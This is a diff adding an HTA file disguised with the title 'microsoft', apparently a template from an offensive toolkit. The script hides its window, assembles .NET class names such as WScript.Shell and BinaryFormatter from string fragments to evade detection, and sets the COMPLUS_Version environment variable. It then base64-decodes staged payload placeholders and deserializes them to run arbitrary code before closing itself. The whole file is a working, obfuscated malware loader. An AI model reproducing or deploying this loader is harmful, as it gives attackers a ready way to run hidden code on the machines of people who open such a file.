@@ -1,0 +1,89 @@
+<html> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" />
+<head> 
+
+    <title>microsoft</title>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=9">
+    
+    <script language="javascript">
+      		function archer(x,y) {
+                var yy1 = "Syste"
+                var yy2 = "m.Text.A"
+                var yy3 = "SCIIEnco"
+                var yy4 = "ding"
+                var yy = yy1 + yy2 + yy3 + yy4
+
+				var pam = new ActiveXObject(yy);
+				var ruler = pam.GetByteCount_2(x);
+				var bo = pam.GetBytes_4(x);
+
+                var zz1 = "Syste"
+                var zz2 = "m.Security.C"
+                var zz3 = "ryptography.FromBa"
+                var zz4 = "se64Transform"
+                var zz = zz1 + zz2 + zz3 + zz4
+
+				var tfor = new ActiveXObject(zz);
+				bo = tfor.TransformFinalBlock(bo, 0, ruler);
+
+                var ee1 = "Syste"
+                var ee2 = "m.IO.Memor"
+                var ee3 = "yStream"
+                var ee = ee1 + ee2 + ee3
+
+				var bman = new ActiveXObject(ee);
+				bman.Write(bo, 0, y);
+				bman.Position = 0;
+				return bman;
+			}
+
+			var h1 = "%_STAGE1_%";
+			var h2 = "%_STAGE2_%";
+
+            var ss1 = "Syste"
+            var ss2 = "m.Runtime.S"
+            var ss3 = "erialization.Format"
+            var ss4 = "ters.Binar"
+            var ss5 = "y.BinaryF"
+            var ss6 = "ormatter"
+            var ss = ss1 + ss2 + ss3 + ss4 + ss5 + ss6
+
+			try {
+
+                var br1 = 'W'
+                var br2 = 'Scri'
+                var br3 = 'pt.S'
+                var br4 = 'hell'
+                var br = br1 + br2 + br3 + br4
+
+				var yolo = new ActiveXObject(br);
+				stat = 'v' + '4.0.' + '303' + '19';
+
+				try {
+					yolo.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NE' + 'TFramework\\v4' + '.0.30' + '319\\');
+				} catch(e) { 
+					stat = 'v' + '2.' + '0.50' + '727';
+				}
+
+				yolo.Environment('P' + 'rocess')('CO' + 'MPLU' + 'S_Version') = stat;
+
+				var oo1 = archer(h1, %_STAGE1Len_%);
+				var fat1 = new ActiveXObject(ss);
+				fat1.Deserialize_2(oo1);
+	
+			} catch (e) {
+				try{		
+					var oo2 = archer(h2, %_STAGE2Len_%);
+					var fat2 = new ActiveXObject(ss);
+					fat2.Deserialize_2(oo2);
+
+				}catch (e2){}
+			}
+			window.resizeTo(0,0)
+			window.close()
+    </script>
+</head> 
+
+</html> 
